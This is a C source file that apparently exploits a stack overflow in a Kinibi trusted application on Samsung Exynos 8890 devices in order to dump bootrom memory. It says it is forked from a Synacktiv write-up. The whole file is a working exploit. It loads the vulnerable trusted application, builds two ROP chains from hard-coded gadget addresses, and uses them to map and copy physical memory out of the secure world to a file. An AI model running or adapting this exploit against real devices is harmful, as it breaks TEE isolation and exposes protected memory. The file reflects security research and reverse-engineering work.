// forked from https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html
// to https://github.com/frederic/exynos8890-bootrom-dump

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#include "MobiCoreDriverApi.h"

#define err(f_, ...) {printf("[\033[31;1m!\033[0m] "); printf(f_, ##__VA_ARGS__);}
#define ok(f_, ...) {printf("[\033[32;1m+\033[0m] "); printf(f_, ##__VA_ARGS__);}
#define info(f_, ...) {printf("[\033[34;1m-\033[0m] "); printf(f_, ##__VA_ARGS__);}
#define warn(f_, ...) {printf("[\033[33;1mw\033[0m] "); printf(f_, ##__VA_ARGS__);}

void printArray(unsigned char buf[], unsigned int n) {
	int i;
	for (i = 0; i < n; i++)
	{
		printf("%02X", buf[i]);
	}
	printf("\n");
}

int main(int argc, char **argv) {
    mcResult_t ret;
    mcSessionHandle_t session = {0};
    mcBulkMap_t map;
    uint32_t stack_size;
    char *to_map;

    if(argc != 2) {
        printf("Usage: %s <offset>\n", argv[0]);
        exit(1);
    }

    uint32_t offset = strtoul(argv[1], NULL, 16);

    // ROPgadget --binary fffffffff0000000000000000000001b.tlbin \
    //             --rawArch arm --rawMode thumb --offset 0x1000
    uint32_t rop_chain[0x300] = {
        0x39dc + 1, // pop {r0, r1, r2, r3, r4, r5, r6, pc}
        0x8,        // r0 tlApi_callDriver=0x8
        0x40002,    // r1 driverId
        0xdf0f8,    // r2 params address on the stack
        0x0,        // r3 (not used)
        0x0,        // r4 (not used)
        0x0,        // r5 (not used)
        0x0,        // r6 (not used)
        0x07d01008,  //  tlApiLibEntry
//@0xdf0f8:
        0xf,//handler ID
        0x0,//SPID
        0xdf104,//params on the stack
//@0xdf104:
        0x0,
        0x0,
        0x0,
    };

    FILE *f = fopen(
        "/data/local/tmp/G930FXXU1DQAN_fffffffff0000000000000000000001b.tlbin",//sha1: 3f2a62d5ba8113be2dd1287234ae04a3188733ea
        "rb"
    );
    if(!f) {
        err("Can't open TA %s\n",argv[1]);
        return 1;
    }
    fseek(f, 0, SEEK_END);
    uint32_t ta_size = ftell(f);
    fseek(f, 0, SEEK_SET);


    char *ta_mem = malloc(ta_size);
    if (fread(ta_mem, ta_size, 1, f) != 1) {
        err("Can't read TA");
        return 1;
    }

    uint32_t tciLen = 0x20000; // TA access to fixed offset on this WSM
                               // so the buffer should be large enough
    uint32_t *tci = malloc(tciLen);

    ret = mcOpenDevice(MC_DEVICE_ID_DEFAULT);
    if(ret != MC_DRV_OK) {
        err("Can't mcOpenDevice\n");
        return 1;
    }

    to_map = malloc(0x1000);

    ret = mcOpenTrustlet(&session, 0, ta_mem, ta_size, 
                         (uint8_t *)tci, tciLen);
    if(ret == MC_DRV_OK) {
        // map the string in TA virtual space, the API returns
        // the address in the TA space.
        ret = mcMap(&session, to_map, 40960, (mcBulkMap_t *)&map);
        if (ret != MC_DRV_OK) {
            err("Can't map in\n");
            return 1;
        }
        ok("Address in TA virtual memory : 0x%x (0x%x bytes)\n", map.sVirtualAddr, map.sVirtualLen);

        uint32_t rop_chain_dr[] = {
        0x18f22+1, // pc => @gadget0:    pop.w      { r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, pc }
        0x0, // r1 (overwritten)
        0x0 + offset,// r2 => @startPhys0
        0x0, // r3 => @startPhys1
        0x0, // r4 (overwritten)
        0x0, // r5
        0x0, // r6 (overwritten)
        0x0, // r7
        0x0, // r8
        0x0, // r9
        0x0, // r10
        0x0, // r11
        0x123a0+1, // pc => @gadget1:   pop        { r0, r1, r4, r6, pc }
        0x80000 + offset, // r0 => @@startVirt
        0x0, // r1 / param_2 (overwritten with 0x1000) => mapSize
        0x0, // r4
        0x0, // r6
        0x1254c + 1, // pc => @gadget2: MapPhys64 + 2 (skip push)
        //              00012558 08 bd           pop        { r3, pc }
        0x0, // (overwritten) => param_2
        0x1bbd0 + 1, // pop        { r1, r2, r6, pc }
        0x9, // param_2 => attr, r1
        0x123a0 + 1,// r2, pc => @gadget4: pop        { r0, r1, r4, r6, pc }
        0x0, // r6
        0x19ecc + 1, // pc => pop.w      { r4, r5, r6, lr } ; mov        r0,#0x0 ; bx         r2
        0x0, // r4
        0x0, // r5
        0x0, // r6
        0x18f22 + 1, // lr =>  pop.w      { r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, pc }
        map.sVirtualAddr, // r0 : TA virt addr
        0x0, // r1
        0x0, // r4
        0x0, // r6
        0x12490 + 1, // pc => drApiAddrTranslateAndCheck
        0x80000 + offset,// r1
        0x1000,// r2 =>memcpy size
        0x0,// r3
        0x0,// r4
        0x0,// r5
        0x0, // r6
        0x0, // r7
        0x0, // r8
        0x0, // r9
        0x0, // r10
        0x0, // r11
        0xdc38 + 1, // pc =>  memcpy (thumb=0) // END
        0x0,
        0xc682 + 1, //pc => Back to DriverHandler to exit without crash
        0xc1c0, //r0 : "VALIDATOR [WARN ]: SPID - 0x%08X 0x%08X"
        };

        rop_chain[0x8c] = 0x13c + sizeof(rop_chain_dr);//memcpy size

        memcpy(&rop_chain[0x9b], rop_chain_dr, sizeof(rop_chain_dr));

        stack_size  = 0xD0;  // fill stack frame
        stack_size += 0x20;  // popped registers size

        // fill tciBuffer
        tci[0] = 27;                             // cmd id in TA for vulnerable handler
        tci[3] = stack_size + sizeof(rop_chain); // memcpy size
        memcpy(&tci[4 + stack_size/4], &rop_chain, sizeof(rop_chain));

        // notify the TA
        mcNotify(&session);
        mcWaitNotification(&session, 2000);
        mcCloseSession(&session);
    }
    mcCloseDevice(MC_DEVICE_ID_DEFAULT);

    char fdout_name[32];
    snprintf(fdout_name, sizeof(fdout_name), "dump_0x%x.bin", offset);
    FILE* fdout = fopen(fdout_name, "wb");
    printf("Dumped to file %s\n", fdout_name);
    fwrite(to_map, 1, 0x1000, fdout);
    fclose(fdout);
    printArray(to_map, 0x1000);
    return 0;
}
